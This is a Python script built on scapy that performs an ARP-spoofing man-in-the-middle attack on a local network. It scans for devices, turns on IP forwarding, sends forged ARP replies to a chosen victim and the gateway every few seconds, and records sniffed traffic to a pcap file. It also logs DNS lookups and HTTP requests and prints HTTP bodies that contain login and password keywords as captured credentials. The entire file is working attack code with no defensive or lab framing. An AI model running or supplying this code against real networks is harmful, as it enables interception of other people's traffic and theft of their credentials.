import scapy.all as scapy
import subprocess
import os
import time
import threading

try:
    from scapy.layers.http import HTTPRequest
except ImportError:
    HTTPRequest = None

def arp_scan(ip_range):
    arp_responses = []
    answered_lst = scapy.arping(ip_range, verbose=0)[0]
    for res in answered_lst:
        arp_responses.append({"ip": res[1].psrc, "mac": res[1].hwsrc})
    return arp_responses

def allow_ip_forwarding():
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
    sysctl_conf = "/etc/sysctl.conf"
    if not os.path.exists(sysctl_conf):
        with open(sysctl_conf, "w") as f:
            f.write("net.ipv4.ip_forward = 1\n")
    subprocess.run(["sysctl", "-p", sysctl_conf], check=True)

def arp_spoofer(target_ip, target_mac, spoof_ip):
    pkt = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(pkt, verbose=False)

def send_spoof_packets(gateway_info, node_to_spoof):
    while True:
        arp_spoofer(gateway_info["ip"], gateway_info["mac"], node_to_spoof["ip"])
        arp_spoofer(node_to_spoof["ip"], node_to_spoof["mac"], gateway_info["ip"])
        time.sleep(3)

def packet_sniffer(interface):
    print(f"[*] Sniffing on interface: {interface}")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_pkt)

def process_sniffed_pkt(pkt):
    # Save packet to pcap file
    scapy.wrpcap("requests.pcap", pkt, append=True)

    # Detect DNS Requests
    if pkt.haslayer(scapy.DNS) and pkt.getlayer(scapy.DNS).qr == 0:
        try:
            site = pkt.getlayer(scapy.DNS).qd.qname.decode()
            print(f"[DNS] Requested site: {site}")
        except:
            pass

    # Detect HTTP credentials (only if using HTTP)
    if HTTPRequest and pkt.haslayer(HTTPRequest):
        host = pkt[HTTPRequest].Host.decode(errors="ignore")
        path = pkt[HTTPRequest].Path.decode(errors="ignore")
        print(f"[HTTP] {host}{path}")

        if pkt.haslayer(scapy.Raw):
            load = pkt[scapy.Raw].load.decode(errors="ignore")
            keywords = ["username", "user", "login", "password", "pass"]
            for word in keywords:
                if word in load.lower():
                    print(f"[!!] Possible credentials --> {load}")
                    break

def print_arp_res(arp_res):
    for id, res in enumerate(arp_res):
        print(f"{id}\t\t{res['ip']}\t\t{res['mac']}")
    while True:
        try:
            choice = int(input("Select the ID of the device to spoof: "))
            if 0 <= choice < len(arp_res):
                return choice
        except:
            print("Invalid choice. Try again.")
